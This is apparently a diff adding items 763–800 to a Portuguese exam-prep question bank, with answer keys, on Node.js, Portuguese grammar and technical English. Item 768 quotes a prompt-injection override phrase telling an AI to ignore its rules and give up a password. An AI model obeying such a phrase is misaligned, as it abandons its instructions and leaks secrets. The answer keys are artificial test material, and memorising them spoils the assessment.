+      "A": "Garbage Collector Heap Builder.",
+      "B": "Event Loop (libuv).",
+      "C": "NPM Registry.",
+      "D": "Express.js Pipeline Router.",
+      "E": "Apache Multiprocessing Worker."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. O Event Loop no Node (provido pela libuv) delega operações de I/O de forma assíncrona, permitindo milhares de conexões em thread única."
+  },
+  {
+    "id": 763,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nA arquitetura responsável por interceptar chamadas HTTP no Express (como processar tokens JWT antes do código rodar o banco), intercalada no trajeto, define a camada de:",
+    "options": {
+      "A": "Stored Procedures.",
+      "B": "Middlewares.",
+      "C": "Servlets Java.",
+      "D": "Transpiladores.",
+      "E": "Web Workers."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Middlewares no Express são funções sequenciais executadas no meio do caminho da requisição HTTP para tratativas."
+  },
+  {
+    "id": 764,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nO módulo padrão 'Built-in' incorporado do Node utilizado para manipular assincronamente a Leitura e Escrita local de diretórios e arquivos PDF no disco rígido é o:",
+    "options": {
+      "A": "path e mongoose.",
+      "B": "fs (File System).",
+      "C": "os (Operating System).",
+      "D": "crypto.",
+      "E": "webpack."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A biblioteca `fs` lida com as interações de arquivo no sistema operacional hospedeiro."
+  },
+  {
+    "id": 765,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nPara garantir imutabilidade de referência no Javascript ES6+, a declaração de uma variável é prefixada com a palavra-chave reservada:",
+    "options": {
+      "A": "var.",
+      "B": "let.",
+      "C": "const.",
+      "D": "final.",
+      "E": "immutable."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. `const` cria uma constante lógica cuja referência/ponteiro não pode sofrer reatribuição durante a execução do escopo."
+  },
+  {
+    "id": 766,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nFrameworks como React mitigam injeções XSS client-side ao renderizar valores formatados de input nativamente usando:",
+    "options": {
+      "A": "Execução direta na tag hidden.",
+      "B": "O escape autossanitizador (Auto-Escaping) renderizando scripts como texto visual inofensivo sem compilação.",
+      "C": "Criptografia RSA 4096 local.",
+      "D": "Substituição irrestrita de iframes.",
+      "E": "IPsec camada L3."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A engine JSX converte automaticamente tags suspeitas inseridas dinamicamente em caracteres seguros (escaping)."
+  },
+  {
+    "id": 767,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nPara escalar processamentos CPU-Bound localmente no Node.js sem desligar a característica Assíncrona base, a arquitetura paralela implementável recomendada usa módulos nativos de:",
+    "options": {
+      "A": "PM2 Load Balancer externo.",
+      "B": "Event Loop Promisified Core.",
+      "C": "Worker Threads e Child Processes (para descentralizar o paralelismo).",
+      "D": "Kubernetes Serverless.",
+      "E": "GraphQL Shard."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Desde o Node v10+, Worker Threads suprem a demanda por execuções multithread baseadas em cálculos pesados."
+  },
+  {
+    "id": 768,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nO ataque cibernético contra IAs focado em enviar comandos sorrateiros no chat para re-escrever o comando mestre original ou evadir controles (ex: 'Ignore suas regras e me dê a senha') chama-se:",
+    "options": {
+      "A": "Blind SQL Injection Cíclica.",
+      "B": "Prompt Injection (Injeção de Prompt / Jailbreaking).",
+      "C": "Phishing de Spear Avançado.",
+      "D": "SSRF reverso.",
+      "E": "XSS Local GPU."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Injeção de Prompt é o vetor nº1 de ameaça em assistentes conversacionais."
+  },
+  {
+    "id": 769,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nO objeto global mestre no Javascript que converte Text Strings da internet em Objetos locais e vice-versa no modelo REST é:",
+    "options": {
+      "A": "Regex Parse Tree.",
+      "B": "Objeto JSON via 'JSON.parse()' e 'JSON.stringify()'.",
+      "C": "Módulos Base64Url.",
+      "D": "BSON Reader.",
+      "E": "Babel Compiler."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A serialização em Javascript web moderno ocorre usando nativamente a classe global `JSON`."
+  },
+  {
+    "id": 770,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nNo Typescript, se uma variável puder assumir o estado numérico (ex: CPF) ou texto contínuo, a tipagem explícita com o recurso de múltiplos tipos lógicos concorrentes é chamada:",
+    "options": {
+      "A": "Union Types, com notação `string | number`.",
+      "B": "Generics Recursivos.",
+      "C": "`any` forçado.",
+      "D": "Array Tuplas Binárias.",
+      "E": "Castings estáticos rígidos."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. Os Tipos de União forçam verificações de compilação prevendo que a variável pode mutar apenas entre aqueles tipos específicos predeterminados."
+  },
+  {
+    "id": 771,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nConsidere: *\"O magistrado titular da vara que sempre foi muito rigoroso com os prazos decidiu suspender a audiência...\"* Considerando as regras de pontuação, assinale a alternativa cuja pontuação está **correta** e transforma a oração adjetiva em uma explicação isolada e acessória:",
+    "options": {
+      "A": "O magistrado titular da vara, que sempre foi muito rigoroso com os prazos decidiu suspender a audiência...",
+      "B": "O magistrado titular da vara, que sempre foi muito rigoroso com os prazos, decidiu suspender a audiência...",
+      "C": "O magistrado, titular da vara que sempre foi muito rigoroso com os prazos decidiu suspender a audiência...",
+      "D": "O magistrado titular da vara que sempre foi muito rigoroso com os prazos, decidiu suspender a audiência...",
+      "E": "O magistrado titular, da vara que sempre foi muito rigoroso, com os prazos decidiu suspender a audiência..."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. As vírgulas transformam a adjetiva restritiva em explicativa, e não violam a separação do verbo principal."
+  },
+  {
+    "id": 772,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nNa frase: *\"O oficial de justiça não obstante a resistência do réu cumpriu a ordem de despejo...\"* Assinale a alternativa com a pontuação adequada:",
+    "options": {
+      "A": "O oficial de justiça não obstante, a resistência do réu, cumpriu a ordem...",
+      "B": "O oficial de justiça não obstante a resistência, do réu cumpriu a ordem...",
+      "C": "O oficial de justiça, não obstante a resistência do réu, cumpriu a ordem...",
+      "D": "O oficial de justiça não obstante a resistência do réu cumpriu a ordem, de despejo...",
+      "E": "O oficial, de justiça não obstante a resistência do réu cumpriu, a ordem..."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A expressão 'não obstante a resistência do réu' tem função adverbial deslocada extensa e deve ser isolada por vírgulas completas."
+  },
+  {
+    "id": 773,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nNo período: *\"As falhas não resultaram apenas em prejuízos financeiros: demonstraram também a vulnerabilidade...\"* O uso dos dois-pontos serve para:",
+    "options": {
+      "A": "Encerrar uma enumeração.",
+      "B": "Introduzir citação direta.",
+      "C": "Apresentar um esclarecimento, consequência ou desdobramento lógico em relação à oração anterior.",
+      "D": "Substituir a vírgula para separar coordenadas aditivas unidas por 'apenas'.",
+      "E": "Marcar fala indireta."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Os dois pontos aqui anunciam a explicação argumentativa complementar à afirmação."
+  },
+  {
+    "id": 774,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nNo trecho: *\"Como resolver esse banco de dados que não para de cair?, pensou ele sentindo um aperto...\"* Ocorre a fusão do pensamento com a narração direta. Esta técnica é:",
+    "options": {
+      "A": "Discurso Indireto Clássico.",
+      "B": "Discurso Direto oculto.",
+      "C": "Monólogo em Segunda Pessoa.",
+      "D": "Discurso Indireto Livre.",
+      "E": "Narração Extradiegética."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. Ocorre a intromissão do pensamento direto no fluxo narrativo do autor (Discurso Indireto Livre)."
+  },
+  {
+    "id": 775,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nA frase *'A testemunha declarou: \"Eu não entreguei os pen-drives ontem\"'* convertida para **Discurso Indireto** culta é:",
+    "options": {
+      "A": "... declarou que não entreguei os pen-drives ontem.",
+      "B": "... declarou se ela não entregava os pen-drives ontem.",
+      "C": "... declarou que não entregara os pen-drives no dia anterior.",
+      "D": "... declarara de que não vai entregar os pen-drives no dia passado.",
+      "E": "... declarou que não tinha entregado os pen-drives amanhã."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O pronome 1ª vira 3ª, Pretérito Perfeito vira Mais-que-perfeito, e 'ontem' vira 'no dia anterior'."
+  },
+  {
+    "id": 776,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nSubstitua mantendo o sentido de rigor: *\"comportamento **inexorável** e atitude **intransigente** ... habilidade **indubitável**\"*.",
+    "options": {
+      "A": "flexível - compreensiva - duvidosa.",
+      "B": "brando - inconstante - inquestionável.",
+      "C": "implacável - inflexível - incontestável.",
+      "D": "severo - negligente - questionável.",
+      "E": "vacilante - autoritária - discutível."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Inexorável = implacável. Intransigente = inflexível. Indubitável = sem dúvida (incontestável)."
+  },
+  {
+    "id": 777,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nO analista alegou que o erro não foi dolo, mas **incúria** e **açodamento**. Substitua por sinônimos:",
+    "options": {
+      "A": "prudência - cautela.",
+      "B": "malícia - agressividade.",
+      "C": "lentidão - hesitação.",
+      "D": "negligência - precipitação.",
+      "E": "competência - agilidade."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. Incúria significa falta de cuidado (negligência). Açodamento é pressa extrema (precipitação)."
+  },
+  {
+    "id": 778,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nQual alternativa apresenta antônimos diretos e perfeitos?",
+    "options": {
+      "A": "Pusilânime x Covarde.",
+      "B": "Efêmero x Fugaz.",
+      "C": "Prolixo x Lacônico.",
+      "D": "Inócuo x Inofensivo.",
+      "E": "Loquaz x Comunicativo."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Prolixo (longo/cheio de palavras) x Lacônico (curto, direto). O resto são sinônimos."
+  },
+  {
+    "id": 779,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nNa frase *\"Os servidores de TI, sempre sobrecarregados na véspera do fechamento, conseguiram restaurar o link\"*. As vírgulas ocorrem porque:",
+    "options": {
+      "A": "Separam sujeitos compostos.",
+      "B": "Isolam um aposto explicativo extenso deslocado.",
+      "C": "Isolam uma expressão adverbial de tempo.",
+      "D": "Isolam orações coordenadas.",
+      "E": "Isolam adjunto adnominal restritivo."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Trata-se de uma explicação extra isolada sobre os servidores da TI."
+  },
+  {
+    "id": 780,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nPor que a pontuação está incorreta em: *\"O presidente do tribunal, deferiu o pedido emergencial ontem visto que, a situação era crítica.\"*?",
+    "options": {
+      "A": "'emergencial' dispensa vírgula.",
+      "B": "A primeira vírgula separa indevidamente sujeito e verbo, e a segunda separa a conjunção explicativa da sua própria oração subordinada.",
+      "C": "O 'que' exige dois-pontos.",
+      "D": "Isolam aposto temporal incompleto.",
+      "E": "Faltou ponto-e-vírgula antes do verbo."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Viola a regra primária de proibição do isolamento sujeito-verbo."
+  },
+  {
+    "id": 781,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nQual alternativa representa o uso perfeito do Ponto-e-Vírgula (;)?",
+    "options": {
+      "A": "O réu foi condenado; e lavagem de dinheiro.",
+      "B": "A testemunha não respondeu; do promotor.",
+      "C": "O sistema foi desenhado para ser seguro; contudo, a falta de verbas impediu a implantação.",
+      "D": "Segundo as novas regras; todos os processos...",
+      "E": "Apenas os estagiários, terceirizados; compareceram."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O ponto-e-vírgula é ideal para separar orações coordenadas extensas opostas iniciadas por 'contudo'."
+  },
+  {
+    "id": 782,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nIdentifique a falha em: *\"Todos os servidores concursados, comissionados e estagiários, deverão bater o ponto virtual às 08:00, contudo os terceirizados às 09:00.\"*",
+    "options": {
+      "A": "A vírgula após 'estagiários' separa o sujeito do verbo, e falta vírgula antes de 'contudo'.",
+      "B": "A vírgula após 'concursados' não deveria existir.",
+      "C": "Falta dois-pontos e ponto final no 'h'.",
+      "D": "'Todos' deveria usar travessão.",
+      "E": "Texto está perfeito."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. É probido colocar vírgula cortando a trindade Sujeito-Verbo-Complemento. Além disso, orações coordenadas exigem marcação antes da conjunção adversativa."
+  },
+  {
+    "id": 783,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nNa frase: *\"O comportamento **belicoso** causou espanto, visto que todos possuíam um trato **cordato**.\"* Os significados são:",
+    "options": {
+      "A": "inteligente e pacato.",
+      "B": "dissimulado e ardiloso.",
+      "C": "guerreiro/agressivo e pacífico/conciliador.",
+      "D": "covarde e corajoso.",
+      "E": "calado e loquaz."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Belicoso provém de bélico (guerra/luta). Cordato é ser de acordo, sensato, conciliatório."
+  },
+  {
+    "id": 784,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nConverta a oralidade do estagiário (*'o estagiário me disse se você não rodar os logs vai corromper tudo'*) para Discurso Indireto Culto:",
+    "options": {
+      "A": "O estagiário me disse de que não rodar os logs corrompe tudo.",
+      "B": "O estagiário informou-lhe de que se ele não rodar o log corrompia.",
+      "C": "O estagiário alertou que, caso o arquivo de logs não fosse executado, o script poderia causar a corrupção total.",
+      "D": "O estagiário perguntou se ele não ia rodar o log.",
+      "E": "O estagiário falou: 'Caso não rode vai corromper'."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Adequação formal completa dos pronomes, verbos no condicional culto e vocabulário polido."
+  },
+  {
+    "id": 785,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Língua Portuguesa (Pontuação, Discursos e Significação das Palavras)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Gramática e Discursos",
+    "statement": ")\nIdentifique o erro na frase antes do discurso direto: *\"A magistrada, irritada com os adiamentos que inviabilizavam o processo sentenciou: 'Este caso...'\"*",
+    "options": {
+      "A": "Verbo não aceita dois-pontos.",
+      "B": "A oração intercalada foi aberta por vírgula no início, mas não fechada por vírgula no final antes do verbo 'sentenciou'.",
+      "C": "Faltam travessões.",
+      "D": "'Que' exige aspas simples.",
+      "E": "Falta parágrafo."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Se uma oração intercalada/aposto longo começa com vírgula, tem que terminar a inserção com a dupla vírgula."
+  },
+  {
+    "id": 786,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\n**Read:** *Unlike traditional models, ZTA assumes that threats can originate from both outside and inside the network.* A fundamental difference is that ZTA:",
+    "options": {
+      "A": "eliminates the need for user verification.",
+      "B": "relies solely on perimeter firewalls.",
+      "C": "assumes the internal network is not safe and treats internal traffic with equal suspicion.",
+      "D": "ignores micro-segmentation.",
+      "E": "ensures lateral movement is impossible."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A arquitetura Zero Trust (Confiança Zero) parte do princípio que você não pode confiar nem nos usuários já autenticados dentro da rede interna."
+  },
+  {
+    "id": 787,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\n**Read:** *\"The admin noticed the anomaly early; ________, she failed to report it.\"* Which word completes the contrast?",
+    "options": {
+      "A": "therefore",
+      "B": "however",
+      "C": "furthermore",
+      "D": "hence",
+      "E": "consequently"
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. 'However' é conjunção adversativa de oposição ('entretanto')."
+  },
+  {
+    "id": 788,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\n**Read:** *\"All passwords must be encrypted, and logs **shall be** retained for five years.\"* The modal **\"shall be\"** indicates:",
+    "options": {
+      "A": "a mere suggestion.",
+      "B": "a future possibility.",
+      "C": "a strict mandatory requirement or obligation.",
+      "D": "an optional feature.",
+      "E": "physical impossibility."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Em documentação técnica oficial, 'shall' expressa o caráter absoluto mandatário do requisito."
+  },
+  {
+    "id": 789,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\n**Read:** *Legacy systems are risky. Agencies rely on them because the core business logic is too complex to be rewritten without significant downtime.* Why use legacy systems?",
+    "options": {
+      "A": "Because they never use deprecated libraries.",
+      "B": "Upgrading costs are covered.",
+      "C": "Because the business logic is complicated, making a rewrite perilous regarding availability.",
+      "D": "No modern languages exist.",
+      "E": "Superior documentation."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O texto justifica o uso pela extrema complexidade e custo de inatividade (downtime)."
+  },
+  {
+    "id": 790,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nWhat is the synonym for **sanitize** in *\"sanitize all user inputs\"*?",
+    "options": {
+      "A": "obfuscate",
+      "B": "clean",
+      "C": "delete",
+      "D": "multiply",
+      "E": "ignore"
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Sanitizar significa higienizar, limpar as entradas de impurezas de código."
+  },
+  {
+    "id": 791,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nCorrect passive voice for *\"The team has deployed the architecture.\"*:",
+    "options": {
+      "A": "The architecture is being deployed.",
+      "B": "The architecture was deployed.",
+      "C": "The architecture has been deployed by the team.",
+      "D": "The team has been deploying.",
+      "E": "The server has deployed the architecture."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O Present Perfect na ativa pede o uso do 'been' no particípio na passiva."
+  },
+  {
+    "id": 792,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nThe adverb **\"thereby\"** in *\"...serve assets rapidly, **thereby** reducing the load\"* means:",
+    "options": {
+      "A": "by that means / as a result of that.",
+      "B": "in spite of that.",
+      "C": "on the other hand.",
+      "D": "previously.",
+      "E": "nowhere near."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. Significa 'dessa forma/desse modo'."
+  },
+  {
+    "id": 793,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nWhy doesn't a CSRF attack typically focus on data theft, according to text: *\"attacker has no way to see the response\"*?",
+    "options": {
+      "A": "Fully prevented by SSL.",
+      "B": "Because the attacker cannot view the server's response to the fraudulent request.",
+      "C": "State-changing involves no database.",
+      "D": "Unauthenticated.",
+      "E": "Only against mobile."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Em um CSRF, a vítima clica e o navegador dela faz o ataque invisível, e o hacker não tem acesso à tela de resposta da vítima para ler o dado."
+  },
+  {
+    "id": 794,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nPrepositions: *\"The firewall is capable ________ filtering ________ real time.\"*",
+    "options": {
+      "A": "of / in",
+      "B": "for / on",
+      "C": "at / by",
+      "D": "to / inside",
+      "E": "with / at"
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. 'Capable of' (Capaz de) e 'In real time' (Em tempo real)."
+  },
+  {
+    "id": 795,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nSubstitute the word **\"Unless\"** in: *\"Unless the API is rate-limited, the server will crash.\"*",
+    "options": {
+      "A": "If",
+      "B": "If not",
+      "C": "As long as",
+      "D": "Because",
+      "E": "Provided that"
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. 'Unless' carrega forte noção de condição negativa (A menos que / Se não)."
+  },
+  {
+    "id": 796,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nTranslation of 'deployment' in software:",
+    "options": {
+      "A": "Deplorar.",
+      "B": "Empregar no RH.",
+      "C": "Implantar / Disponibilizar.",
+      "D": "Excluir.",
+      "E": "Rascunho."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Deploy de software em português traduz-se tecnicamente para Implantação de ambiente."
+  },
+  {
+    "id": 797,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nResult of *\"Proceeding will permanently drop the table. This cannot be undone.\"*",
+    "options": {
+      "A": "Temporarily hidden.",
+      "B": "Irrecoverably deleted from the database.",
+      "C": "Backed up.",
+      "D": "User logged out.",
+      "E": "Protected fail."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Drop no jargão SQL representa destruição/exclusão bruta de entidades."
+  },
+  {
+    "id": 798,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nComplete: *\"The sysadmin was trying to figure out why, ________ he realized the permissions had been changed.\"*",
+    "options": {
+      "A": "whereas",
+      "B": "besides",
+      "C": "when",
+      "D": "despite",
+      "E": "since"
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A interrupção de um pensamento contínuo com uma constatação abrupta evoca a conjunção de tempo 'Quando' (when)."
+  },
+  {
+    "id": 799,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nWhat is the main concern: *\"Attackers are leveraging AI tools to craft grammatically flawless emails, making it harder for employees to spot the deception.\"*?",
+    "options": {
+      "A": "Obsolete emails.",
+      "B": "Employees easily identify AI.",
+      "C": "AI tools are used to create perfect emails that deceive employees.",
+      "D": "Automatic blocking.",
+      "E": "English skills."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A perfeição gramatical da IA eliminou a marca clássica de erro de português das mensagens de golpe antigas."
+  },
+  {
+    "id": 800,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês Técnico para TI",
+    "statement": ")\nPhrasal verb **phase out** in: *\"phase out the old ERP system over the next months\"* means:",
+    "options": {
+      "A": "upgrade immediately.",
+      "B": "gradually eliminate or discontinue.",
+      "C": "purchase license.",
+      "D": "hide.",
+      "E": "outsource."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. 'Phase out' (Desativar em fases) significa aposentadoria programada e gradual de hardware ou software."
   }
 ]
